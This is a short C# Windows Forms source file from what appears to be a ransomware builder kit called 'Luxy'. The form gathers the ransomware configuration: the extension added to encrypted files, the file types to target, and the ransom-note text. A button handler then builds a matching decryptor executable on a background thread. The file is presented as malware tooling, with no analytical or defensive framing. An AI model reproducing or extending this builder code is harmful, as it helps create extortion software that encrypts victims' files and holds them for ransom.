using System.Threading;
using System.Windows.Forms;
using Luxy.Components.Builder;

namespace Luxy
{
    public partial class RansomewareForm : Form
    {
        public RansomewareForm()
        {
            InitializeComponent();
        }

        public string[] Ransomware_settings
        {
            get
            {
                string[] settings = { encrypt_extension_tb.Text, files_extension_encrypt.Text, readme_tb.Text };
                return settings;
            }
        }

        private void build_decryptor_btn_Click(object sender, System.EventArgs e)
        {

            Settings.EncryptExtension = encrypt_extension_tb.Text;
            Settings.EncryptExtensionList = files_extension_encrypt.Text;

            var fileDialog = new SaveFileDialog();
            fileDialog.Title = "Build";
            fileDialog.Filter = "Excutable file (*.exe)|*.exe";
            fileDialog.DefaultExt = "exe";
            fileDialog.FileName = "Luxy.Decryptor.exe";
            if (fileDialog.FileName == "" || fileDialog.ShowDialog() == DialogResult.Cancel)
            {
                return;
            }
            Thread buildTh = new Thread(() => Builder.BuildDecryptor(fileDialog.FileName));
            buildTh.IsBackground = true;
            buildTh.Start();
        }
    }
}
